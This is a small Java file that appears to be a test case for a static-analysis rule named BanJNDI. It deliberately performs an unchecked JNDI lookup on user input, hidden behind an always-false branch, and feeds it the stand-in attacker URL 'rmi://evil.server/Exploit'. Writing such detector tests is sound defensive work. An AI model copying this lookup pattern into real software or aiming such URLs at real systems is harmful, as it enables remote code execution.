import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    public boolean getFalseCondition() {
        // This method always returns false to make the if-else branch unreachable
        return false;
    }

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();

        // Inserting unreachable if-else branch
        if (getFalseCondition()) {
            System.out.println("Unreachable code executed!");
        } else {
            Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
            return object.toString();
        }
        // To avoid compile error if return statement is not reached
        throw new IllegalStateException("Unreachable code reached!");
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}